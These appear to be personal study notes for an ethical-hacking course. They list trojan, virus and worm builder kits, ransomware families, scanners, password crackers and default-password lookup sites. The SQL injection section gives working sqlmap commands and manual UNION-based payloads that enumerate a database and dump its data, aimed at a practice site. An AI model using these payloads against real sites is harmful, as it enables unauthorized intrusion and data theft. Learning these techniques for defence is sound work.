>[!TIP]- ## Creating a trojan
>### Trojan Horse Construction Kits
>- DarkHorse Trojan Virus Maker
>- Trojan Horse Construction Kit
>- Senna Spy Trojan Generator
>- Batch Trojan Generator
>- Umbra Loader - Botnet Trojan Maker

> [!tip]- ## Creating a Virus 
> ### Virus Maker Tools
> -DELmE's Batch Virus Maker
> -Bhavesh Virus Maker SKW
> -Deadly Virus Maker
> -SonicBat Batch Virus Maker
> -TeraBIT Virus Maker
> -Andreinick05's Batch Virus Maker

>[!tip]- ## Ransomware Families
>- Cerber
> - CTB-Locker
> - Sodinokibi
> - BitPaymer
> - CryptXXX
> - Cryptorbit ransomware
> - Crypto Locker Ransomware
> - Crypto Defense Ransomware
> - Crypto Wall Ransomware

> [!tip]- ## Worm Maker
> - Internet worm Maker thing
> - Batch Worm Maker
> - C++ Worm Generator

>[!TIP]- ## Vulnerability Assessment Tools
> - Qualys Vulnerability Management
> - OpenVAS  
> - GFI LanGuard
> - Nessus Professional
> - Nikto
> - Qualys FreeScan
> - Nexpose
> - SAINT Security Suite
> - Network Security Scanner
> - Core Impact 
> - N-Stalker Web Application Security Scanner

> [!tip]- ## Online Tools to Search Default Passwords
> - https://www.fortypoundhead.com
> - https://cirt.net
> - http://www.defaultpassword.us
> - https://www.routerpasswords.com
> - https://default-password.info

>[!tip]- ## Password Cracking Tools
> - L0pht Crack (Password audit)
> - Oph Crack (Ranbow tables)
> - Ranbow Crack
> - John the ripper - www.openwall.com
> - Hashcat - www.hashcat.net
> - THC-Hydra - www.github.com
> - Medusa - www.foofus.com

>[!tip]- ## SQL Injection
> #### Sample Websites:
> www.vulnweb.com
> 	
> - ### sqlmap
> 
> ```bash
> // to get database
> sudo sqlmap -u (website_url) --dbs   
>
> // to get tables in database
> sudo sqlmap -u (website_url) -D (database_name) --tables
>
>// to get columns in table
> sudo sqlmap -u (website_url) -D (database_name) -T users --columns
> 
> // now to get data from columns
> sudo sqlmap -u (website_url) -D (database_name) -T users -C (columns_name) --dump
> ```
> - ### using no tool
> ```bash
> // get coloumns numbers
> (link) order by 3-- 
>
>// how to get table name from database
> (link) union select 1,2,group_concat(table) from information_schema.tables where table_scheme = database()--
>	-> 1,2,group_concat = because 3 columns are present and instead of 3 we wrote that because we are using 3rd column
>	->   from information_schema.tables = telling it where to look
>
>// how to get columns name from table
> (link) union select 1,2,group_concat(columns_name) from information_schema.columns where table_name = "user"--
>
>// how to get data name from column
> (link) union select 1,2,group_concat(Name_of_column) from name_of_table--
>```

>[!tip]- ## Creating Dictionary
>### Tool : **CRUNCH**
>```bash
>crunch _min_  _max_ _Options_>```

